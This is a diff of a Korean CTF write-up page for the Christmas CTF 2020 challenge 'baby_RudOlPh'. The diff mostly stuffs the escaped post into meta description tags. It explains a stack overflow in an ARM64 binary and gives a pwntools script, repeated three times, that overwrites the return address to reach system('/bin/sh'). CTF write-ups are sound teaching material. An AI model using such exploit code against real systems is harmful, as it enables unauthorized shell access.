@@ -13,15 +13,71 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;p&gt;baby_RudOlPh&amp;#xB294; baby &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xB2F5;&amp;#xAC8C; &amp;#xC774;&amp;#xBC88; Christmas CTF&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB9CE;&amp;#xC740; &amp;#xC194;&amp;#xBC84;&amp;#xAC00; &amp;#xB098;&amp;#xC654;&amp;#xB358; &amp;#xBB38;&amp;#xC81C; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/1.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xBC1B;&amp;#xACE0; &amp;#xBCF4;&amp;#xD638;&amp;#xAE30;&amp;#xBC95;&amp;#xACFC; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCCD0;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; 64bit ARM&amp;#xC774;&amp;#xACE0;, NX bit&amp;#xB9CC; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xB294;&amp;#xAC78; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/2.png&#34; alt&gt;&lt;br&gt;&amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; vuln&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB300;&amp;#xB193;&amp;#xACE0; &amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. read &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294;&amp;#xB370; 0x100&amp;#xB9CC;&amp;#xD07C; &amp;#xBC1B;&amp;#xC544;&amp;#xC11C; stack overwflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/3.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;get_arm&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xAC12;&amp;#xC774; &lt;code&gt;0x1225&lt;/code&gt; &amp;#xBA74; &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD574; &amp;#xC258;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/4.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ARMmaker&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xB294; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC138;&amp;#xD305; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; gadget&amp;#xC774; &amp;#xC788;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;vuln&lt;/code&gt; &amp;#xC758; return address&amp;#xB97C; &lt;code&gt;ARMmaker&lt;/code&gt;&amp;#xC758; gadget&amp;#xC73C;&amp;#xB85C; overwrite&lt;/li&gt;
+&lt;li&gt;gadget&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &lt;code&gt;0x1225&lt;/code&gt;&amp;#xB85C; &amp;#xC138;&amp;#xD305;&amp;#xD558;&amp;#xACE0; &lt;code&gt;get_arm&lt;/code&gt; &amp;#xD638;&amp;#xCD9C;&lt;/li&gt;
+&lt;li&gt;get shell!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./baby_RudOlPh&amp;quot;&lt;/span&gt;)
+context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\\n&amp;quot;&lt;/span&gt;)
+
+payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;72&lt;/span&gt;
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x400724&lt;/span&gt;)
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x1225&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x400738&lt;/span&gt;)
+
+p.sendline(payload)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/5.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB274;&amp;#xBE44;&amp;#xC6A9; &amp;#xD3EC;&amp;#xB108;&amp;#xBE14; &amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xB0B4;&amp;#xB824;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB0E5; &amp;#xB0B4;&amp;#xBA74; &amp;#xC2EC;&amp;#xC2EC;&amp;#xD574;&amp;#xC11C; 64bit ARM&amp;#xC73C;&amp;#xB85C; &amp;#xB0B4;&amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &amp;#xC5ED;&amp;#xC2DC; &amp;#xB9CE;&amp;#xC740; &amp;#xBD84;&amp;#xB4E4;&amp;#xC774; &amp;#xD480;&amp;#xC5B4;&amp;#xC8FC;&amp;#xC168;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;p&gt;(&amp;#xBB38;&amp;#xC81C; &amp;#xB9CC;&amp;#xB4DC;&amp;#xB294; &amp;#xC2DC;&amp;#xAC04;&amp;#xBCF4;&amp;#xB2E4; &amp;#xB3C4;&amp;#xCEE4;&amp;#xC5D0; &amp;#xC138;&amp;#xD305;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xB4DC;&amp;#xB294; &amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB354; &amp;#xC624;&amp;#xB798; &amp;#xAC78;&amp;#xB838;&amp;#xB358; &amp;#xAC74; &amp;#xBE44;&amp;#xBC00;..)&lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[Write-Up] Christmas CTF 2020 - baby-RudOlPh - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;p&gt;baby_RudOlPh&amp;#xB294; baby &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xB2F5;&amp;#xAC8C; &amp;#xC774;&amp;#xBC88; Christmas CTF&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB9CE;&amp;#xC740; &amp;#xC194;&amp;#xBC84;&amp;#xAC00; &amp;#xB098;&amp;#xC654;&amp;#xB358; &amp;#xBB38;&amp;#xC81C; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/1.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xBC1B;&amp;#xACE0; &amp;#xBCF4;&amp;#xD638;&amp;#xAE30;&amp;#xBC95;&amp;#xACFC; &amp;#xC544;&amp;#xD0A4;&amp;#xD14D;&amp;#xCCD0;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; 64bit ARM&amp;#xC774;&amp;#xACE0;, NX bit&amp;#xB9CC; &amp;#xAC78;&amp;#xB824;&amp;#xC788;&amp;#xB294;&amp;#xAC78; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/2.png&#34; alt&gt;&lt;br&gt;&amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; vuln&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB300;&amp;#xB193;&amp;#xACE0; &amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. read &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294;&amp;#xB370; 0x100&amp;#xB9CC;&amp;#xD07C; &amp;#xBC1B;&amp;#xC544;&amp;#xC11C; stack overwflow&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/3.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;get_arm&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC758; &amp;#xAC12;&amp;#xC774; &lt;code&gt;0x1225&lt;/code&gt; &amp;#xBA74; &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD574; &amp;#xC258;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/4.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ARMmaker&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xB294; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC138;&amp;#xD305; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; gadget&amp;#xC774; &amp;#xC788;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;vuln&lt;/code&gt; &amp;#xC758; return address&amp;#xB97C; &lt;code&gt;ARMmaker&lt;/code&gt;&amp;#xC758; gadget&amp;#xC73C;&amp;#xB85C; overwrite&lt;/li&gt;
+&lt;li&gt;gadget&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &lt;code&gt;0x1225&lt;/code&gt;&amp;#xB85C; &amp;#xC138;&amp;#xD305;&amp;#xD558;&amp;#xACE0; &lt;code&gt;get_arm&lt;/code&gt; &amp;#xD638;&amp;#xCD9C;&lt;/li&gt;
+&lt;li&gt;get shell!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./baby_RudOlPh&amp;quot;&lt;/span&gt;)
+context.log_level = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\\n&amp;quot;&lt;/span&gt;)
+
+payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;72&lt;/span&gt;
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x400724&lt;/span&gt;)
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x1225&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+payload += p64(&lt;span class=&#34;hljs-number&#34;&gt;0x400738&lt;/span&gt;)
+
+p.sendline(payload)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/12/29/l0ch/baby_rudolph/5.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB274;&amp;#xBE44;&amp;#xC6A9; &amp;#xD3EC;&amp;#xB108;&amp;#xBE14; &amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xB0B4;&amp;#xB824;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB0E5; &amp;#xB0B4;&amp;#xBA74; &amp;#xC2EC;&amp;#xC2EC;&amp;#xD574;&amp;#xC11C; 64bit ARM&amp;#xC73C;&amp;#xB85C; &amp;#xB0B4;&amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &amp;#xC5ED;&amp;#xC2DC; &amp;#xB9CE;&amp;#xC740; &amp;#xBD84;&amp;#xB4E4;&amp;#xC774; &amp;#xD480;&amp;#xC5B4;&amp;#xC8FC;&amp;#xC168;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
+&lt;p&gt;(&amp;#xBB38;&amp;#xC81C; &amp;#xB9CC;&amp;#xB4DC;&amp;#xB294; &amp;#xC2DC;&amp;#xAC04;&amp;#xBCF4;&amp;#xB2E4; &amp;#xB3C4;&amp;#xCEE4;&amp;#xC5D0; &amp;#xC138;&amp;#xD305;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xB4DC;&amp;#xB294; &amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB354; &amp;#xC624;&amp;#xB798; &amp;#xAC78;&amp;#xB838;&amp;#xB358; &amp;#xAC74; &amp;#xBE44;&amp;#xBC00;..)&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io2020/12/29/l0ch/baby_rudolph/1.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2020/12/29/l0ch/baby_rudolph/">
@@ -240,12 +296,12 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <p>baby_RudOlPh&#xB294; baby &#xC2DC;&#xB9AC;&#xC988; &#xB2F5;&#xAC8C; &#xC774;&#xBC88; Christmas CTF&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xC194;&#xBC84;&#xAC00; &#xB098;&#xC654;&#xB358; &#xBB38;&#xC81C; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png" srcset="/img/loading.gif"></p>
+              <p>baby_RudOlPh&#xB294; baby &#xC2DC;&#xB9AC;&#xC988; &#xB2F5;&#xAC8C; &#xC774;&#xBC88; Christmas CTF&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB9CE;&#xC740; &#xC194;&#xBC84;&#xAC00; &#xB098;&#xC654;&#xB358; &#xBB38;&#xC81C; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png" srcset="/img/loading.gif" alt></p>
 <p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBC1B;&#xACE0; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xACFC; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; 64bit ARM&#xC774;&#xACE0;, NX bit&#xB9CC; &#xAC78;&#xB824;&#xC788;&#xB294;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<p><img src="/2020/12/29/l0ch/baby_rudolph/2.png" srcset="/img/loading.gif"><br>&#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; vuln&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB300;&#xB193;&#xACE0; &#xC90D;&#xB2C8;&#xB2E4;. read &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370; 0x100&#xB9CC;&#xD07C; &#xBC1B;&#xC544;&#xC11C; stack overwflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB124;&#xC694;</p>
-<p><img src="/2020/12/29/l0ch/baby_rudolph/3.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/12/29/l0ch/baby_rudolph/2.png" srcset="/img/loading.gif" alt><br>&#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; vuln&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB300;&#xB193;&#xACE0; &#xC90D;&#xB2C8;&#xB2E4;. read &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370; 0x100&#xB9CC;&#xD07C; &#xBC1B;&#xC544;&#xC11C; stack overwflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB124;&#xC694;</p>
+<p><img src="/2020/12/29/l0ch/baby_rudolph/3.png" srcset="/img/loading.gif" alt></p>
 <p><code>get_arm</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC758; &#xAC12;&#xC774; <code>0x1225</code> &#xBA74; <code>system(&quot;/bin/sh&quot;)</code>&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<p><img src="/2020/12/29/l0ch/baby_rudolph/4.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/12/29/l0ch/baby_rudolph/4.png" srcset="/img/loading.gif" alt></p>
 <p><code>ARMmaker</code> &#xD568;&#xC218;&#xC5D0;&#xB294; &#xC778;&#xC790;&#xB97C; &#xC138;&#xD305; &#xD560; &#xC218; &#xC788;&#xB294; gadget&#xC774; &#xC788;&#xB124;&#xC694;.</p>
 <ol>
 <li><code>vuln</code> &#xC758; return address&#xB97C; <code>ARMmaker</code>&#xC758; gadget&#xC73C;&#xB85C; overwrite</li>
@@ -265,8 +321,7 @@ payload += p64(<span class="hljs-number">0x400738</span>)
 
 p.sendline(payload)
 p.interactive()</code></pre>
-
-<p><img src="/2020/12/29/l0ch/baby_rudolph/5.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/12/29/l0ch/baby_rudolph/5.png" srcset="/img/loading.gif" alt></p>
 <p>&#xB274;&#xBE44;&#xC6A9; &#xD3EC;&#xB108;&#xBE14; &#xBB38;&#xC81C;&#xB97C; &#xB0B4;&#xB824;&#xB294;&#xB370; &#xADF8;&#xB0E5; &#xB0B4;&#xBA74; &#xC2EC;&#xC2EC;&#xD574;&#xC11C; 64bit ARM&#xC73C;&#xB85C; &#xB0B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xC5ED;&#xC2DC; &#xB9CE;&#xC740; &#xBD84;&#xB4E4;&#xC774; &#xD480;&#xC5B4;&#xC8FC;&#xC168;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
 <p>(&#xBB38;&#xC81C; &#xB9CC;&#xB4DC;&#xB294; &#xC2DC;&#xAC04;&#xBCF4;&#xB2E4; &#xB3C4;&#xCEE4;&#xC5D0; &#xC138;&#xD305;&#xD558;&#xB294;&#xB370; &#xB4DC;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xC624;&#xB798; &#xAC78;&#xB838;&#xB358; &#xAC74; &#xBE44;&#xBC00;..)</p>
 
